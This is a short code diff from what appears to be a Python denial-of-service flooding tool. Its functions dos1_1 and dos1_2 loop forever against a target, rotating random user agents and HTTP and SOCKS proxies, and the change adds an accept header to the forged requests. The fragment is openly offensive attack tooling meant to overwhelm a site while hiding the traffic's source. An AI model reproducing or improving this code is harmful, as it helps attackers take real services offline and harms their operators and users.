@@ -50,10 +50,10 @@ os.remove("proxysocks")
 def dos1_1(target):
     while True:
         useragent = random.choice(headersp)
-        header = {'user-agent': useragent}
+        header = {'accept': '*/*', 'user-agent': useragent}
 
         useragent2 = random.choice(headersp)
-        header2 = {'user-agent': useragent2}
+        header2 = {'accept': '*/*', 'user-agent': useragent2}
 
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
@@ -81,10 +81,10 @@ def dos1_1(target):
 def dos1_2(target):
     while True:
         useragent = random.choice(headersp)
-        header = {'user-agent': useragent}
+        header = {'accept': '*/*', 'user-agent': useragent}
 
         useragent2 = random.choice(headersp)
-        header2 = {'user-agent': useragent2}
+        header2 = {'accept': '*/*', 'user-agent': useragent2}
 
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
